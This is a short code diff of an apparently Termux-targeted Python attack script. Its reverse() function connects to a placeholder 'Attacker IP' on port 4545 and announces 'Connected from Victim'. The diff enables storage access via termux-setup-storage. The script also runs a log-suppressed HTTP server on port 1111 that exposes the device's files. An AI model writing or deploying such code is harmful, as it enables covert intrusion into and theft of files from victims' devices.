@@ -9,18 +9,18 @@ import os
 
 def reverse():
         soc = socket.socket()
-        ip="192.168.42.208"
-        port=667
+        ip="Attacker IP"
+        port=4545
         soc.connect((ip,port))
         soc.send(bytes("Connected from Victim","utf-8"))
-        #os.system('termux-setup-storage')
+        os.system('termux-setup-storage')
 reverse()
 
 def create_server():
         class QuietHandler(http.server.SimpleHTTPRequestHandler):
                 def log_message(self, format, *args):
                         pass
-        with socketserver.TCPServer(("",2002), QuietHandler) as httpd:
+        with socketserver.TCPServer(("",1111), QuietHandler) as httpd:
                 httpd.serve_forever()
 
 
